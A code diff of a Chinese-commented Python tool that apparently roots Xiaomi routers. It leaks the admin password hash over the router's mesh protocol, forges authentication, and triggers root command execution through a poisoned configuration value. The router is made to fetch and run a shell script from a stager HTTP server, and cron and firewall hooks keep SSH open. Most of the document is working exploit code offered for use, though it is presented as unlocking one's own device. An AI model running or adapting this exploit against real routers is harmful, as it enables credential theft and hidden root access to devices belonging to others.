@@ -119,7 +119,6 @@ def init_factory_cap(host):
 
 # ---- 阶段 2：Mesh 漏洞利用与协议层实现 ----
 def _hdr(typ, blen):
-    """标准的 44 字节大端协议包头"""
     h = bytearray(MESH_HDR)
     h[0:2] = struct.pack(">H", MESH_VER)
     h[2:4] = struct.pack(">H", blen)
@@ -127,13 +126,11 @@ def _hdr(typ, blen):
     return bytes(h)
 
 def _q_pass(ident: bytes) -> bytes:
-    """HMAC-SHA256 with the 'q' key variant (server-verify-incoming)"""
     return base64.b64encode(
         hmac.new(b"q" + MESH_KEY[1:], ident, hashlib.sha256).digest()
     )
 
 def _tls_connect(host, port=MESH_PORT, timeout=20.0, retries=4):
-    """连接 cab_meshd TLS 端口（包含重试机制）"""
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
@@ -151,7 +148,6 @@ def _tls_connect(host, port=MESH_PORT, timeout=20.0, retries=4):
             time.sleep(5)
 
 def _send_auth(sock, ident: bytes):
-    """发送 Type-4 认证包：0x00 为 ident，0x10 处放置 HMAC"""
     b = bytearray(0xA4)
     b[0:len(ident)] = ident
     p = _q_pass(ident)
@@ -159,16 +155,11 @@ def _send_auth(sock, ident: bytes):
     sock.sendall(_hdr(4, len(b)) + bytes(b))
 
 def _send_running(sock):
-    """发送 Type-5 包使状态机流转到 ST_RUNNING"""
     b = bytearray(0x20)
     b[0] = 1
     sock.sendall(_hdr(5, len(b)) + bytes(b))
 
 def leak_admin_stok(host, ident=b"ota0001", timeout=20.0):
-    """
-    完整的 Mesh 协议流：
-    TLS -> Type-4 Auth -> Type-5 Running -> 接收并解析 Type-6 配置同步包提取 web_passwd256
-    """
     s = _tls_connect(host, timeout=timeout)
     _send_auth(s, ident)
     time.sleep(1.0)
@@ -210,11 +201,9 @@ def leak_admin_stok(host, ident=b"ota0001", timeout=20.0):
         raise RuntimeError("未在超时时间内收到路由器返回的 Type-6 配置同步包。")
     h256 = cfg.get("web_passwd256", "")
     if not h256:
-        # 如果未设置管理密码，尝试使用出厂默认 hash
         h256 = FACTORY_ADMIN_HASH
     print(f"[+] 成功提取原厂管理凭据: {h256[:16]}...")
 
-    # 登录换取管理员会话 token
     nonce = f"0_00:00:00:00:00:00_{int(time.time())}_{random.randint(1000, 9999)}"
     pwd = hashlib.sha256((nonce + h256).encode()).hexdigest()
     res = http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/login", {
@@ -225,7 +214,7 @@ def leak_admin_stok(host, ident=b"ota0001", timeout=20.0):
         raise RuntimeError(f"换取管理 token 失败: {res}")
     return stok
 
-# ---- 远程自愈与固化 Shell 构造 ----
+# ---- 远程自愈与深度固化 Shell 构造 ----
 def build_remote_sh(root_password):
     safe_pwd = root_password.replace("'", "'\\''")
     return f"""#!/bin/sh
@@ -242,12 +231,19 @@ nvram commit
 bdata set ssh_en=1 2>/dev/null
 bdata commit 2>/dev/null
 
-# 3. 创建持久化守护脚本 (/data 分区在重启或升级时不会丢失)
+# 3. 创建持久化守护脚本 (/data 分区在重启、重配网络或升级时 100% 保留)
 mkdir -p /data/auto_ssh
 cat << 'EOF' > /data/auto_ssh/auto_ssh.sh
 #!/bin/sh
+# 确保 NVRAM 标记
 [ "$(nvram get ssh_en)" = 0 ] && nvram set ssh_en=1 && nvram commit
 
+# 关键：修补官方 dropbear 启动脚本，解除 release 稳定版对 SSH 的硬编码限制
+if [ -f /etc/init.d/dropbear ]; then
+    sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
+fi
+
+# 确保 dropbear 自启并运行
 if [ -z "$(pidof dropbear)" ]; then
     /etc/init.d/dropbear enable
     /etc/init.d/dropbear restart 2>/dev/null
@@ -271,10 +267,11 @@ uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'
 uci set firewall.auto_ssh.enabled='1'
 uci commit firewall
 
-# 5. 保底计划任务 (每 5 分钟巡视一次服务状态，防止中继模式抹掉防火墙)
-(crontab -l 2>/dev/null | grep -v "auto_ssh"; echo "*/5 * * * * /data/auto_ssh/auto_ssh.sh") | crontab - 2>/dev/null
+# 5. 保底计划任务 (每 2 分钟巡视一次服务状态，防范中继模式刚切换完的几分钟窗口)
+(crontab -l 2>/dev/null | grep -v "auto_ssh"; echo "*/2 * * * * /data/auto_ssh/auto_ssh.sh") | crontab - 2>/dev/null
 
-# 6. 立即拉起 Dropbear SSH
+# 6. 解锁当前环境下的 dropbear 脚本并立即拉起服务
+sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
 /etc/init.d/dropbear enable
 /etc/init.d/dropbear restart 2>/dev/null
 
@@ -326,10 +323,13 @@ uci commit firewall 2>/dev/null
 # 5. 清理 crontab 定时任务
 (crontab -l 2>/dev/null | grep -v "auto_ssh") | crontab - 2>/dev/null
 
-# 6. 锁定 root 用户密码（恢复出厂禁用直接登录状态）
+# 6. 还原 dropbear 脚本
+[ -f /etc/init.d/dropbear ] && sed -i 's/channel="debug"/channel="release"/g' /etc/init.d/dropbear
+
+# 7. 锁定 root 用户密码（恢复出厂禁用直接登录状态）
 passwd -l root 2>/dev/null
 
-# 7. 确保 Web 界面处于出厂向导状态
+# 8. 确保 Web 界面处于出厂向导状态
 uci -q set xiaoqiang.common.INITTED='NO'
 uci commit xiaoqiang 2>/dev/null
 """
@@ -347,10 +347,6 @@ class StagerServer(http.server.BaseHTTPRequestHandler):
         pass
 
 def trigger_rce(host, ident=b"ota0001", timeout=20.0, settle=4.0):
-    """
-    规范的 Type-7 触发流程：
-    Type-4 -> Type-5 -> Type-7 (通知 cap_init 读取 poisoned UCI 执行 root eval)
-    """
     s = _tls_connect(host, timeout=timeout)
     _send_auth(s, ident)
     time.sleep(1.0)
@@ -371,7 +367,6 @@ def trigger_rce(host, ident=b"ota0001", timeout=20.0, settle=4.0):
         pass
 
 def execute_remote_payload(host, local_ip, payload_content):
-    """通过漏洞执行指定的远程脚本"""
     port = 8123
     StagerServer.triggered = False
     StagerServer.payload = payload_content.encode("utf-8")
@@ -403,7 +398,6 @@ def execute_remote_payload(host, local_ip, payload_content):
         time.sleep(1)
 
 def do_unlock(host, local_ip):
-    """分支 1：开启 SSH 并固化"""
     print("\n【设置 Root 密码】")
     root_pwd = input("请输入您想为路由器设置的 root 密码 [直接回车默认: admin]: ").strip()
     if not root_pwd:
@@ -416,13 +410,9 @@ def do_unlock(host, local_ip):
     choice = input("请选择工作模式 [1 或 2，回车默认 1]: ").strip()
     is_relay = (choice == "2")
 
-    # 步骤 1: 初始化出厂环境
     init_factory_cap(host)
-
-    # 步骤 2 & 3: 触发注入并下发固化脚本
     execute_remote_payload(host, local_ip, build_remote_sh(root_pwd))
 
-    # 步骤 4: 验证 SSH 状态
     print("\n[+] 步骤 4/4: 检查 SSH 服务状态...")
     time.sleep(4)
     if port_open(host, 22):
@@ -432,29 +422,16 @@ def do_unlock(host, local_ip):
         print(f"  SSH 登录密码: {root_pwd}")
         print(f"  命令行连接:   ssh root@{host}")
         print("=" * 68)
-        print("\n[+] 状态已恢复：已自动将路由器 Web 页面复原为【开箱初始向导】状态！")
-        print("    现在打开浏览器访问 http://192.168.31.1 ，即可像全新机一样正常设置向导")
-        print("    （设置 WiFi 密码、宽带拨号，或直接在向导中选择中继模式）。")
-        print("    无论网页如何配置，后台已固化的 Root / SSH 权限均会长驻生效。")
+        print("\n[+] 状态已就绪：无需手动重启路由器！")
+        print("    ★ 此时 SSH 服务已经在后台正常运行，可先连上验证。")
+        print("    ★ 接着您可以打开浏览器访问 http://192.168.31.1 走完设置向导。")
+        print("    ★ 如果设置了【中继模式】，请特别注意：")
+        print("       路由器 IP 会变为主路由分配的 IP（不再是 192.168.31.1），")
+        print("       请去主路由器后台查看新 IP，并使用新 IP 登录 SSH！")
     else:
         print(f"[!] 端口 22 尚未响应，请等待数秒后在终端执行: ssh root@{host}")
 
-    if is_relay:
-        print("\n" + "#" * 68)
-        print("  【中继模式后续防覆盖建议】")
-        print("  1. 请现在打开浏览器登录 http://192.168.31.1 完成初始化向导，")
-        print("     并在后台设置中将工作模式切换为【中继模式】(无线中继或有线中继)。")
-        print("  2. 切换后，路由器 IP 会变为主路由器分配的新 IP。")
-        print("  3. 脚本已自动内置了防护机制，开机自启不会丢失。")
-        print("  4. 【可选】如果日后想关闭每 5 分钟的巡视任务，只需 SSH 连上路由器后运行：")
-        print("     crontab -l | grep -v 'auto_ssh' | crontab -")
-        print("#" * 68)
-    else:
-        print("\n[*] 提示：如果日后想关闭每 5 分钟的巡视任务，可随时连上 SSH 运行：")
-        print("    crontab -l | grep -v 'auto_ssh' | crontab -")
-
 def do_revert(host, local_ip):
-    """分支 2：撤销 Root 并彻底关闭 SSH"""
     print("\n" + "=" * 68)
     print("           【撤销 Root 权限与关闭 SSH 服务向导】")
     print("=" * 68)
